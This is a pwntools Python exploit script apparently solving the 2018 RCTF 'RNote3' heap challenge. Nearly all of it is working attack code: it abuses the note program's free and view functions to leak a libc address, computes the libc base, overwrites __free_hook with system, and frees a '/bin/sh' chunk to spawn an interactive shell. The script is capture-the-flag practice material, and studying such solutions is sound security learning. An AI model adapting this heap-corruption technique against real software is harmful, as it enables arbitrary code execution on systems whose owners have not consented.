from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./2018_RCTF_RNote3")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./2018_RCTF_RNote3")
else:
	pass

def add(title,size,content):
	p.sendline("1")
	p.sendlineafter("input title: ",title)
	p.sendlineafter("size: ",str(size))
	p.sendlineafter("content: ",content)

def view(title):
	p.sendline("2")
	p.sendlineafter("title: ",title)

def edit(title,content):
	p.sendline("3")
	p.sendlineafter("title: ",title)
	p.sendlineafter("content: ",content)

def free(title):
	p.sendline("4")
	p.sendlineafter("title: ",title)

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x125F)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
add("a",0x60,"/bin/sh")
add("b",0x100,"s2")
add("c",0x60,"s3")
add("d",0x100,"s4")
add("e",0x60,"s5")
view("d")
free("f")
view("")
p.recvuntil("content: ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
free("e")
payload = "a"*8 + p64(8) + p64(libc.symbols["__free_hook"])
add("f",0x18,payload)
edit("a"*8,p64(libc.symbols["system"]))
free("a")
p.interactive()
